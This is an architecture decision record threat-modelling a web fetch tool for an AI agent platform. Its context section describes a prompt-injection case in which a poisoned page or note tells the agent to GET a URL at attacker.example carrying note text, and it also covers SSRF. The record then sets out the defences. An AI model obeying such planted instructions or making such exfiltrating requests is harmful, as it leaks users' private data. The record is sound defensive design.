# ADR-0006: Web fetch threat model (amends ADR-0004)

## Status
Accepted (2026-11-14). Amends ADR-0004; ADR-0004's claim "never exfiltration endpoints" is withdrawn.

## Context
ADR-0004 allows two tools together: read notes and web fetch (GET only). That pair is an exfiltration channel. A poisoned page or note can tell the agent to GET `https://attacker.example/?d=<note text>`, and a GET with data in the URL leaks that data. "GET only" limits the method, not the leak. A fetch tool also reaches the server's own network: localhost, the LAN, and cloud metadata addresses (SSRF).

## Decision
The web fetch tool ships only with all of these:
- **Per-agent domain allowlist.** An agent with web fetch lists the hosts it may call. Empty list means the tool refuses every request. No wildcard host.
- **Address blocking.** Refuse loopback, private, link-local, unique-local and metadata addresses (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7, fe80::/10, and IPv4 addresses mapped into IPv6).
- **Check the resolved IP, not only the hostname.** Resolve the name, check the address, then connect to that address, so DNS rebinding cannot swap it afterwards.
- **Re-check on every redirect.** Each redirect target goes through the allowlist and address checks again. Cap redirects at 3.
- **Limits.** Response size cap (1 MB), timeout (10 s), text content types only, no cookies, no custom headers from the model.
- **Request shape.** The model supplies a URL only. Requests to an allowed host still go into the run log with the full URL.
- **Strict mode default for the pair.** An agent that has both read-notes and web-fetch starts in strict mode (writes need approval). The owner may turn strict mode off per agent after seeing this warning in the UI.

## Consequences
- Allowlisted hosts can still receive data in a URL. The allowlist narrows the channel to hosts the owner chose; it does not close it. The run log makes any such request visible after the fact.
- Template agents that browse (for example a news digest) ship with an explicit host list the owner reviews.
- ADR-0004's other decisions (three archetypes, snapshots before writes, call_agent depth 1) are unchanged.

## Amendment (2026-11-26, todo item 47)
Once a `fetch_url` call in an earlier round of a run returned a page, a later fetch in that run may go only to a host the run already read, and with no query string. Anything else is refused with an error that says why, and the run log records it. A fetch the owner approves (`approveTools: fetch_url`) is the owner's decision and is not refused. Reason: a page is untrusted text that can ask the agent to carry note text out in an address; this rule is enforced in code, not left to the model. Calls in the same round as the first fetch are not limited, because the model chose them before it saw any page.
